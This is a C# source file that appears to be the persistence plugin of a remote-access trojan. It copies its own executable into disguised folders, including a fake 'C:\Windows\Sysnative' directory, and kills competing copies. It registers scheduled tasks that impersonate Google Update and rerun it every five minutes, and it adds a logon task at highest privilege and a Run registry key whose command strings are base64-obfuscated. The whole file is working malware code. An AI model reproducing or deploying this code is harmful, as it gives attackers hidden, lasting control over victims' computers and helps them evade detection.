using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Handler
{
    class HandleSchtask
    {
        public static string Author = "Google";
        public static string Description = "Google Update Task Machine";
        public static string Task = "GoogleUpdateTaskMachine";
        public static string TaskAdmin = "GoogleUpdateTaskMachineAdmin";
        public static void AddStartUp()
        {
            try
            {
                string name = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath = Path.Combine(Path.GetTempPath()+"\\" + Guid.NewGuid().ToString("N") + "\\", name);

                if (Methods.IsAdmin()&& Environment.Is64BitOperatingSystem) 
                {
                    try
                    {
                        filepath = Path.Combine(@"C:\Windows\Sysnative", name);                        
                        FileInfo installPath = new FileInfo(filepath);
                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                        {
                            foreach (Process P in Process.GetProcesses())
                            {
                                if (P.MainModule.FileName == installPath.FullName)
                                {
                                    P.Kill();                                    
                                }
                            }
                            if (Directory.Exists(@"C:\Windows\Sysnative"))
                                Directory.Delete(@"C:\Windows\Sysnative");
                            if (!Directory.Exists(@"C:\Windows\Sysnativetemp"))
                                Directory.CreateDirectory(@"C:\Windows\Sysnativetemp");
                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(@"C:\Windows\Sysnativetemp", name), true);
                            Computer MyComputer = new Computer();
                            MyComputer.FileSystem.RenameDirectory(@"C:\Windows\Sysnativetemp", "Sysnative");
                        }                        
                    }
                    catch
                    {
                        try {
                            filepath = Path.Combine(Path.GetTempPath(), name);
                            FileInfo installPath = new FileInfo(filepath);
                            if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                            {

                                foreach (Process P in Process.GetProcesses())
                                {
                                    try
                                    {
                                        if (P.MainModule.FileName == installPath.FullName)
                                            P.Kill();
                                    }
                                    catch { }
                                }
                                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                            }                            
                        } 
                        catch 
                        {
                            filepath = Process.GetCurrentProcess().MainModule.FileName;
                        }                        
                    }
                    
                    TaskService ts = new TaskService();
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = Description;
                    td.RegistrationInfo.Author = Author;
                    TimeTrigger dt = new TimeTrigger();
                    dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
                    dt.Repetition.Interval = TimeSpan.FromMinutes(5);
                    td.Triggers.Add(dt);
                    td.Settings.DisallowStartIfOnBatteries = false;
                    td.Settings.RunOnlyIfNetworkAvailable = true;
                    td.Settings.RunOnlyIfIdle = false;
                    td.Settings.DisallowStartIfOnBatteries = false;
                    td.Actions.Add(new ExecAction(filepath, "", null));
                    ts.RootFolder.RegisterTaskDefinition(TaskAdmin, td);
                } 
                else
                {
                    try
                    {
                        filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                        FileInfo installPath = new FileInfo(filepath);
                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                        {
                            foreach (Process P in Process.GetProcesses())
                            {
                                try
                                {
                                    if (P.MainModule.FileName == installPath.FullName)
                                        P.Kill();
                                }
                                catch { }
                            }
                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                        }                        
                    }
                    catch
                    {
                        filepath = Path.Combine(Path.GetTempPath(), name);
                        FileInfo installPath = new FileInfo(filepath);
                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                        {
                            foreach (Process P in Process.GetProcesses())
                            {
                                try
                                {
                                    if (P.MainModule.FileName == installPath.FullName)
                                        P.Kill();
                                }
                                catch { }
                            }
                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                        }                        
                    }
                    TaskService ts = new TaskService();
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = Description;
                    td.RegistrationInfo.Author = Author;
                    TimeTrigger dt = new TimeTrigger();
                    dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
                    dt.Repetition.Interval = TimeSpan.FromMinutes(5);
                    td.Triggers.Add(dt);
                    td.Settings.DisallowStartIfOnBatteries = false;
                    td.Settings.RunOnlyIfNetworkAvailable = true;
                    td.Settings.RunOnlyIfIdle = false;
                    td.Settings.DisallowStartIfOnBatteries = false;
                    td.Actions.Add(new ExecAction(filepath, "", null));
                    ts.RootFolder.RegisterTaskDefinition(Task, td);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

        }
        public static void DelStartUp()
        {
            try
            {
                using (TaskService _taskService = new TaskService())
                {
                    _taskService.RootFolder.DeleteTask(Task, false);
                }
                using (TaskService _taskService = new TaskService())
                {
                    _taskService.RootFolder.DeleteTask(TaskAdmin, false);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static bool GetStartUp()
        {
            try
            {
                TaskCollection taskCollection;
                TaskCollection taskCollectionAdmin;
                using (TaskService _taskService = new TaskService())
                {
                    taskCollection = _taskService.RootFolder.GetTasks(new Regex(Task));
                    if (taskCollection.Count != 0)
                    {
                        return true;
                    }
                    taskCollectionAdmin = _taskService.RootFolder.GetTasks(new Regex(TaskAdmin));
                    if (taskCollectionAdmin.Count != 0)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return false;
            }
        }
    }

    class HandleNormalStartup
    {
        public static void Install()
        {
            try
            {
                string name = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath;
                try
                {
                    filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                }
                catch
                {
                    filepath = Path.Combine(Path.GetTempPath(), name);
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                }
                if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = System.Text.Encoding.Default.GetString(Convert.FromBase64String("L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g")) + "\"" + Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName) + "\"" + " /tr " + "'" + "\"" + filepath + "\"" + "' & exit",//"/c schtasks /create /f /sc onlogon /rl highest /tn "
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    });
                }
                else
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree))//"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
                    {
                        key.SetValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName), "\"" + filepath + "\"");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }
        public static void DelStartUp()
        {
            try
            {
                using (TaskService _taskService = new TaskService())
                {
                    _taskService.RootFolder.DeleteTask(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName), false);
                }
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree))//"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
                {
                    key.DeleteValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName));
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

        }

        public static bool GetStartUp()
        {
            try
            {
                TaskCollection taskCollection;
                using (TaskService _taskService = new TaskService())
                {
                    taskCollection = _taskService.RootFolder.GetTasks(new Regex(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)));
                }
                if (taskCollection.Count != 0)
                {
                    return true;
                }
                else
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree))//"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
                    {
                        return !(key.GetValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)) == null);
                    }
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return false;
            }

        }
    }
}
